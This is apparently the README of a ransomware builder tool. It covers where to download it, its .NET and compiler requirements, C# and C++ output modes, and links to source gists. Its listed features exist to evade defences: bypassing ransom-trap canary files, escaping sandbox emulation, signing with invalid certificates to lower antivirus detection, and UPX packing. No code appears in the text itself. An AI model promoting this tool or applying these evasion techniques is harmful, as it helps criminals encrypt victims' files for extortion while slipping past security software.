## How to build your own ransomware
## Download
Download the latest build from https://github.com/kaixinol/Ransomware-Maker.cs/releases, note that it requires [.NET 6.0 runtime environment](https://dotnet.microsoft.com/en-us/download/dotnet/6.0).
## Features
- `Reduce program size`: as the name suggests, it reduces the size of the compiled program.
- `Anti ransom trap`: This feature does this by ignoring specific entropy values of certain ransom trap files.
- `Anti sandbox`: This breaks out of sandbox emulation by calling a custom hibernation function.
- `Self-signed certificate`: Reduce antivirus engine detection rate by signing *invalid certificates* *(requires internet connection)*.
- `UPX compression`: Call UPX to reduce the size of the generated program after compilation *(can't compress C# program)*
## Mode
### C#
Features: No need to download additional compilers, as long as your OS version is greater than or equal to Win 7, you can call the system's native C# compiler *.NET version* ≥3.5 installed on your system is required to run it, and it does not support being compressed by upx.
### C++
Features: [Need to download extra compiler](https://www.msys2.org/#:~:text=and%20what%20for.-,Installation,-Download%20the%20installer), no additional requirements at runtime, supports compression by upx.
## Gist
- [C++](https://gist.github.com/kaixinol/89e8b333a61388b204b7b5a6d972b309) 
- [C#](https://gist.github.com/kaixinol/1e2e2c7826c0130ae14d01fb7950d869)
